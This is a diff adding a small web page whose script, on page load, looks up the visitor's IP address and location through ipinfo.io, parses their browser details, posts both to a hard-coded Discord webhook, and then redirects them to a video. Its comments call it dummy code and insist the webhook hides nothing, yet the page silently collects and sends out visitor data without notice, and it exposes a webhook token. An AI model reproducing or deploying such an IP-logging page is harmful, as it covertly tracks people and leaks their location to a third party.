@@ -1,0 +1,41 @@
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script src="Assets/Scripts/platform.js"></script>
+
+<!-- dummy code, overall it's a good startup in javascript, I need to improve more rather than doing some old complicated binary-related thingys in useless languages -->
+
+<script>
+    var done = false;
+
+    // ty https://thehotcode.com/javascript-wait-for-condition-in-function
+    function wait(pass) {
+        if (!pass) {
+            setTimeout(wait, 1000, pass)
+        } else {
+            console.log(done)
+            alert("a")
+            window.location.replace("https://piped.video/watch?v=R9djYRJ55oc");
+        }
+    }
+
+    // please if you can send requests and understand how to talk back to me I beg you, please do, I really want some activities while I can.
+    // The webhook is here, very healthy :) and good, you can simply use it, no scams or whatever may a webhook contain, check the bytes if you're worried,
+    // but I assure you, nothing is hiding, anyway, it's not hashed because I know many people do get lazy, here it is "take it or lose it" I guess:
+    $.get("https://ipinfo.io", function (response) {
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1099558196550570014/Fmp5gN7egkQ63pmGK8gMKGCINfiyidjZ2cP89OGJvEacqAMb5W2AqSRKIznuL-uKSER3");
+        request.setRequestHeader('Content-type', 'application/json');
+
+        var info = platform.parse(navigator.userAgent);
+        msg = "response: " + JSON.stringify(response, null, 4) + "\n\ninfo: " + JSON.stringify(info, null, 4)
+
+        request.send(
+            JSON.stringify({
+                content: msg
+            })
+        );
+        
+        setTimeout(() => {
+            window.location.replace("https://piped.video/watch?v=R9djYRJ55oc");
+        }, 1000);
+    }, "json");
+</script>
